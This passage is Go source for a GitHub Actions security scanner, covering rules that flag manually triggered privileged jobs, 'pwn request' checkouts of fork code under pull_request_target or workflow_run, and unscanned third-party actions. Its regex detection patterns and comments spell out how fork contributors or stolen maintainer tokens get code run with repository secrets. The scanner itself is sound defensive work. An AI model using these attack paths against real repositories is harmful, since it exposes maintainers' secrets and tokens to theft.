		"lands on any branch in the repository. That is the entry point for a compromised maintainer " +
		"account: the attacker pushes a malicious workflow straight to the default branch, there is no " +
		"pull request and no review, and it runs with the repository's secrets. Restrict it to the " +
		"branches you build from, and put anything that should be deliberate behind workflow_dispatch."
}

// ---------------------------------------------------------------- rule 8

// Rule 8: workflow_dispatch on a job that can reach credentials.

// Rule8ID is the rule identifier for rule 8.
const Rule8ID = "PPE-008"

// Rule8 reports a dormant privileged job: a workflow that someone can trigger
// by hand, running a job that holds secrets.
//
// Warn, not Block. A workflow_dispatch trigger on a privileged job is a
// reasonable thing for a maintainer to want, and it is what deploy buttons are
// built out of. It is a risk worth naming, not a mistake.
//
// It is also one of the five components of the GhostAction composite, and like
// rule 7 it cannot trigger that composite alone.
func Rule8(file *parse.File) findings.Findings {
	if !file.Triggers.Has("workflow_dispatch") {
		return nil
	}

	var out findings.Findings
	for _, job := range file.Jobs {
		sensitive, why := sensitiveJob(file, job)
		if !sensitive {
			continue
		}
		out = append(out, findings.New(Rule8ID, findings.SeverityWarn, rule8Message(why), jobLocation(file, job)))
	}
	return out
}

func rule8Message(why string) string {
	return "workflow_dispatch lets someone with write access run this workflow on demand, and " + why +
		". That is a dormant privileged job: nothing in the workflow looks wrong until it is triggered, " +
		"and then it runs with credentials it should not be reachable with. A stolen maintainer token can " +
		"use it to run code in a job that is allowed to deploy or publish, with no pull request to review. " +
		"Keep workflow_dispatch on the jobs that need it, and put anything privileged behind an " +
		"environment with required reviewers."
}

// ---------------------------------------------------------------- rule 9

// Rule 9: pwn request. A privileged trigger that runs a pull request's code.

// Rule9ID is the rule identifier for rule 9.
const Rule9ID = "PPE-009"

// Rule9 reports a workflow that combines a privileged trigger with a way of
// getting pull request code into a job that runs with credentials.
//
// The two events are pull_request_target and workflow_run, and they are the only
// two that are privileged while also being reachable by a fork. A plain
// pull_request runs with a read-only token, cannot see repository secrets, and
// cannot run on a workflow file from a fork at all, so checking out PR code
// there is the ordinary way to test a pull request. That workflow is not this
// finding, and matching it would be matching most of GitHub Actions.
//
// Block. There is no CVE-scale incident here, but the miss is total compromise:
// a fork contributor opens a pull request, the workflow checks their code out,
// and their code runs with the repository's secrets and a write-scoped token.
// There is no partial credit.
//
// The shell-command shape is narrower than the obvious one, deliberately. Any
// `git fetch` at all would flag real workflows doing the documented hardening
// move of fetching the trusted base. See the comment on prFetchRef for the split
// that replaced it.
func Rule9(file *parse.File) findings.Findings {
	if !pwnRequestTrigger(file) {
		return nil
	}

	var out findings.Findings
	for _, job := range file.Jobs {
		for _, step := range job.Steps {
			line, why := untrustedFetchReason(step)
			if why == "" {
				continue
			}
			loc := stepLocation(file, job, step)
			loc.Line = line
			out = append(out, findings.New(
				Rule9ID,
				findings.SeverityBlock,
				rule9Message(why),
				loc,
			))
		}
	}
	return out
}

// pwnRequestTrigger reports whether the workflow is triggered in a way that
// carries privileges a fork can reach.
func pwnRequestTrigger(file *parse.File) bool {
	return file.Triggers.Has("pull_request_target") || file.Triggers.Has("workflow_run")
}

// The expressions that hand a pull request's own code to a checkout.
//
// head.sha is the fork's commit and refs/pull/N/merge is the merge GitHub
// builds for a pull request. Neither is the repository's code, which is the
// whole difference: what a pull_request_target job runs by default is the base
// branch, and it takes naming one of these to run the contributor's instead.
var (
	headSHA = regexp.MustCompile(`github\.event\.pull_request\.head\.sha`)
	pullRef = regexp.MustCompile(`refs/pull/`)
	// head.repo is the fork's repository, matched on the parent so that
	// full_name, clone_url, ssh_url and git_url are all covered. Only full_name
	// is a valid repository: input, but all four name the fork and a workflow
	// that reaches for any of them is reaching for the attacker's copy.
	headRepo = regexp.MustCompile(`github\.event\.pull_request\.head\.repo\b`)
)

// The commands that bring a pull request's code into a run: step by hand.
//
// checkout refuses fork code on these events by default, so reaching past it is
// a deliberate opt-out. gh pr checkout is unambiguous: there is no reason to
// check a pull request out into a privileged job other than to run it.
//
// `gh run download` was here and is not any more. GitHub Security Lab recommends
// workflow_run plus an artifact download as the safe replacement for
// pull_request_target, CodeQL documents the same pair, and it is how real
// pipelines promote a build to a deploy job. A Block finding on the officially
// blessed pattern is a finding with no way to act on it, and a gate that
// produces findings nobody can resolve gets disabled.
//
// That leaves an artifact hand-off undetected, deliberately. CodeQL's
// actions-untrusted-checkout queries already cover it, and cross workflow
// analysis is not something a per file rule can do anyway.
var (
	gitFetch     = regexp.MustCompile(`\bgit\s+fetch\b`)
	ghPRCheckout = regexp.MustCompile(`\bgh\s+pr\s+checkout\b`)
)

// A fetch of the pull request's own ref, as opposed to a fetch of the base.
//
// This distinction is the whole rule. `git fetch origin main` under
// pull_request_target is the documented hardening move: pull the trusted base
// config precisely because the job is privileged, and then run it rather than
// the contributor's code. Real workflows doing exactly that were blocked by an
// earlier version of this rule.
//
// A fetch of pull/N/head is not decidable from the fetch alone, and GitHub
// Security Lab's own guidance says that treating pull request contents as
// passive data is safe. So a PR ref alone does not block. It blocks when the
// script also checks it out or switches to it, which is the difference between
// reading the diff and running the code.
var (
	// The ref has to allow for the number being an expression rather than a
	// literal, because `pull/${{ github.event.number }}/head` is how most people
	// write it. Requiring \d+ after the slash misses exactly the common form.
	prFetchRef = regexp.MustCompile(`\bpull/(?:\d|\$)|refs/pull/|\bHEAD:pr|\bhead\.sha\b|\bhead_ref\b`)
	// Uses the fetched code rather than reading it.
	checkoutRef = regexp.MustCompile(`\bgit\s+(?:checkout|switch|merge|rebase|cherry-pick|reset)\b`)
	// Builds or runs something, which is what makes a checked out PR fatal.
	// Kept narrow on purpose: a rule that fires on the word "./" is a rule that
	// fires on every repository.
	runsFetched = regexp.MustCompile(`(?m)^\s*(?:\./|make\b|npm\b|npx\b|yarn\b|pnpm\b|bun\b|python3?\b|pytest\b|tox\b|go\b|cargo\b|gradlew?\b|\./gradlew\b|mvn\b|docker\s+build\b)`)
)

// gitFetchShape reports whether a script fetches a pull request's code and then
// uses it as code.
func gitFetchShape(script string) bool {
	if !gitFetch.MatchString(script) || !prFetchRef.MatchString(script) {
		return false
	}
	return checkoutRef.MatchString(script) && runsFetched.MatchString(script)
}

// untrustedFetchReason returns the line and the reason a step pulls in
// untrusted code, or an empty reason when it does not.
//
// All three shapes are checked because two of them are invisible to a check that
// only looks at checkout's with: block. A repository: input and a shell command
// in a run: step are the same attack with a different syntax.
func untrustedFetchReason(step parse.Step) (line int, why string) {
	// Shape 1 and 2: action inputs.
	if ref, ok := step.With.Get("ref"); ok {
		switch {
		case headSHA.MatchString(ref.Text):
			return ref.Line, "the checkout ref is github.event.pull_request.head.sha, which is the fork's own commit"
		case pullRef.MatchString(ref.Text):
			return ref.Line, "the checkout ref is a refs/pull/ ref, which is the merge GitHub built for the pull request"
		}
	}
	if repo, ok := step.With.Get("repository"); ok && headRepo.MatchString(repo.Text) {
		return repo.Line, "the checkout repository is github.event.pull_request.head.repo, which is the fork"
	}

	// Shape 3: a shell command in a run: block, which can fetch from anywhere
	// and is the one shape no checkout-shaped check will ever see.
	// Comments are stripped first: a workflow that documents the command it
	// used to run is not running it.
	run := uncommentedScript(step.Run)
	if at := ghPRCheckout.FindStringIndex(run); at != nil {
		return step.RunLineAt(at[0]), "the step runs gh pr checkout, which checks out the pull request"
	}
	if gitFetchShape(run) {
		at := gitFetch.FindStringIndex(run)
		return step.RunLineAt(at[0]), "the step fetches the pull request's own ref and then checks it out and runs it"
	}
	return 0, ""
}

func stepLocation(file *parse.File, job parse.Job, step parse.Step) findings.Location {
	return findings.AtStep(file.Path, step.Line, job.ID, step.Number, step.Name)
}

func rule9Message(why string) string {
	return "This workflow is triggered by pull_request_target or workflow_run, which run with the base " +
		"repository's token and its secrets even when a fork triggered them, and " + why + ". That hands " +
		"the contributor's code a privileged job: anyone who can open a pull request gets their code " +
		"executed with the repository's credentials, and a token that can write is enough to push the next " +
		"workflow. Keep pull_request_target for trusted code only. If it has to read the pull request, use " +
		"the event metadata rather than its code, and gate the privileged work behind an environment with " +
		"required reviewers so a human sees the author before the job runs."
}

// ---------------------------------------------------------------- rule 10

// Rule 10: cross-repo transitivity. A uses: we cannot read.

// Rule10ID is the rule identifier for rule 10.
const Rule10ID = "PPE-010"

// Rule10 reports a reference to code that lives in another repository, which is
// code this tool does not scan.
//
// Warn, not Block, because third-party actions are near-universal. Most
// repositories use actions they did not write, and a Block tier rule that fires
// on all of them is a Block tier rule that fires on most of GitHub Actions. This
// names a limit rather than a mistake: the code runs with the repository's
// secrets and we have no visibility into what it contains.
//
// It is a standalone finding rather than a modifier on rule 1. It emits on its
// own whenever a reference points outside this repository, INCLUDING when the
// ref is already SHA pinned, because that is a separate signal and a useful one.
// Pinning answers "can this ref be repointed under me"; this answers "what is in
// there", which pinning does not answer at all. A pinned reference to an
// unreadable repository is still unreadable.
//
// Keeping it independent is also what lets every rule stay a pure
// func(workflow) []Finding, so each fixture asserts its own finding count
// without coordinating with rule 1's.
func Rule10(file *parse.File) findings.Findings {
	var out findings.Findings
	for _, site := range allUses(file) {
		repo, _, ref := site.ref.Parts()
		// A local action is code in this repository, which we do scan. A
		// container is not a repository reference at all. Neither is a hop.
		if repo == "" || strings.HasPrefix(repo, "docker://") {
			continue
		}
		out = append(out, findings.New(
			Rule10ID,
			findings.SeverityWarn,
			rule10Message(file, repo, ref),
			site.location(file),
		))
	}
	return out
}

// rule10Message explains the finding, and distinguishes the cases a reader can
// act on differently.
//
// The same-org case is worth calling out because it is the one where a reader can
// usually do something: the code is in an organisation they administer and can
// read, and in many cases it is a repository their own team owns. It stays Warn
// rather than dropping to a lower tier, because a two-tier scheme has nowhere
// lower to go and inventing a third tier for this would give every consumer a
// third case to handle. The message says what kind of reference it is so the
// reader can judge, which is the part the tier cannot express.
func rule10Message(file *parse.File, repo, ref string) string {
	owner, _, _ := strings.Cut(repo, "/")

	var intro string
	switch {
	case file.Repository.IsZero():
		intro = fmt.Sprintf(
			"%s is code from another repository, and this run is scanning a directory rather than a named "+
				"repository, so the tool cannot tell whether it is a third party. Either way it is not being "+
				"scanned: only this repository's workflows are. ", repo)
	case strings.EqualFold(owner, file.Repository.Owner):
		intro = fmt.Sprintf(
			"%s is in your own organisation (%s), which this run is not scanning. It is usually readable by "+
				"your team, so the review is a matter of reading it rather than trusting it blind. ", repo,
			file.Repository.Owner)
	default:
		intro = fmt.Sprintf(
			"%s is code from a third-party repository. ", repo)
	}

	// Pinning is worth naming either way, because a reader who has pinned is
	// likely to think the question is already settled, and it is not.
	pinned := ""
	if commitSHA.MatchString(ref) {
		pinned = " The reference is pinned to a commit, which settles whether the ref can be repointed under " +
			"you, and does nothing about whether the contents are safe. Those are different questions."
	} else if ref != "" {
		pinned = fmt.Sprintf(" It is referenced as %s, a mutable ref, so the content can change without this "+
			"repository changing anything.", ref)
	}

	return intro + "That code runs with this repository's secrets and token inside the job that uses it, and " +
		"no rule in this tool looks inside another repository, so nothing here can tell you what it does." +
		pinned + " Pinning to a commit is the control that matters for supply chain; auditing the repository is " +
		"the control that matters for trust, and this finding is the second one, not a substitute for the first."
}
